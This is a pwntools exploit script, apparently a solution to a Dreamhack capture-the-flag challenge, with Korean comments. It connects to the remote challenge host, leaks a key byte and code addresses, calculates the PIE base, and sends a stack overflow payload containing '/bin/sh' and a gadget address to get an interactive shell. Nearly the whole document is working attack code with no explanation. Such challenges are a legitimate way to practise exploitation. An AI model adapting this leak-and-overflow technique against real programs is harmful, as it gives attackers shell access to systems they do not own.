from pwn import *
                                                                                                              
#p=process("./chall")                                                                                          
p=remote("host3.dreamhack.games",20546)
e=ELF("./chall")                                                                                                                                 
context.log_level='debug'                                                                                                                        
context.terminal=['tmux','splitw','-h']                                                                                                          
context.timeout=pwnlib.timeout.maximum
                                                                                                                                                             
def slog(name, addr): return success(': '.join([name, hex(addr)]))                                                                                           
                                                                                                                                                             
def retrieve_data(weird_data):                                                                                                                               
        print('weird_data: ',weird_data)                                                                                                                                                     
        original_data=int(input('original_data: '),16) #손 계산 후 0x~~꼴로 입력해주기                                                                                                       
        return original_data                                                                                                                                                                 

#gdb.attach(p)

p.recvuntil("key ")
lsb=int(p.recvuntil(".")[:-1])
print("lsb:",hex(lsb))
p.sendafter("You: ",p8(lsb)) #이게맞나
p.recvuntil(":")
weird_hello=hex(int(p.recvuntil("!")[:-1]))
gb_msg_addr=retrieve_data(weird_hello)+0x19-0x30

#gdb.attach(p)

p.sendafter("name: ",b'A'*0x8)
#p.recvuntil("Here is your present ")
weird_libc_csu=p.recvuntil("!")[:-1]

__libc_csu_init_addr=retrieve_data(weird_libc_csu)-77
pie_base=__libc_csu_init_addr-e.symbols["__libc_csu_init"]
gadget=pie_base+e.symbols["secret_gift"]+23

#gdb.attach(p)

slog('gb_msg_addr',gb_msg_addr)
slog('__libc_csu_init',__libc_csu_init_addr)
slog('pie_base',pie_base)
slog('gadget',gadget)


#payload=b"/bin/sh"+b'\x00'+b'A'*0x28+p64(gb_msg_addr+0x8)+p64(gadget)
#payload=b'A'*0x8+b"/bin/sh"+b'\x00'+b'A'*0x20+p64(gb_msg_addr+0x10)+p64(gadget)
payload=b"/bin/sh"+b'\x00'+b'A'*0x20+p64(gb_msg_addr)+p64(gb_msg_addr+0x30)+p64(gadget)
p.sendafter("santa: ",payload)
#print(p.recvall())
p.interactive()
#print(p.recvall())
